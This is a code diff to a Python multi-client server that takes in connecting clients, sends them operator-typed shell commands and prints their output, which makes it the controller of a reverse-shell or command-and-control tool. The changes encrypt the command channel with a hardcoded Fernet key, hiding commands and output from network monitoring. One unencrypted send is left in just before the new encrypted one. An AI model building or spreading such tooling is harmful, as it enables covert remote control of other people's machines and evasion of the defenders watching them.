@@ -6,6 +6,15 @@ from queue import Queue
 import struct
 import signal
 
+import os
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+
+
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
@@ -25,6 +34,13 @@ class MultiServer(object):
         self.socket = None
         self.all_connections = []
         self.all_addresses = []
+        # Generate Key
+        # key = Fernet.generate_key()
+
+        key = b'k_1i71JWlLTHt8N185PUXjFFzu27DnEH2sXNy-aoG30='
+        self.Crypt = Fernet(key)
+
+
 
     def print_help(self):
         for cmd, v in COMMANDS.items():
@@ -79,7 +95,7 @@ class MultiServer(object):
             try:
                 conn, address = self.socket.accept()
                 conn.setblocking(1)
-                client_hostname = conn.recv(1024).decode("utf-8")
+                client_hostname = self.Crypt.decrypt(conn.recv(1024)).decode("utf-8")
                 address = address + (client_hostname,)
             except Exception as e:
                 print('Error accepting connections: %s' % str(e))
@@ -180,15 +196,16 @@ class MultiServer(object):
         :param target: 
         """
         conn.send(str.encode(" "))
-        cwd_bytes = self.read_command_output(conn)
+        conn.send(str.encode(self.Crypt.encrypt(" ".encode(encoding="utf-8")).decode(encoding="utf-8")))
+        cwd_bytes = self.Crypt.decrypt(self.read_command_output(conn))
         cwd = str(cwd_bytes, "utf-8")
         print(cwd, end="")
         while True:
             try:
                 cmd = input()
                 if len(str.encode(cmd)) > 0:
-                    conn.send(str.encode(cmd))
-                    cmd_output = self.read_command_output(conn)
+                    conn.send(str.encode(self.Crypt.encrypt(cmd.encode("utf-8")).decode("utf-8")))
+                    cmd_output = self.Crypt.decrypt(self.read_command_output(conn))
                     client_response = str(cmd_output, "utf-8")
                     print(client_response, end="")
                 if cmd == 'quit':
